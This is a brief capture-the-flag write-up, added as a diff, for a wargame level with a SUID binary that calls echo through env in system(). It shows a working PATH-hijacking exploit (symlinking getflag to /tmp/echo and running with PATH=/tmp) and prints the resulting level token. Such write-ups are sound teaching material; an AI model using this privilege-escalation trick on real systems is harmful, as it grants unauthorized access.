@@ -1,0 +1,16 @@
+for this level we have a suid binary own by the user flag03
+
+$> ./level03
+Exploit me
+
+after disassembling the binary we can see the problem here
+	system("/usr/bin/env echo Exploit me")
+
+we can change the PATH env variable to make echo point to getflag
+for that we can simply do a symlink to getflag binary
+
+$> ln -s /bin/getflag /tmp/echo
+$> PATH=/tmp ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+this token is the level04's password
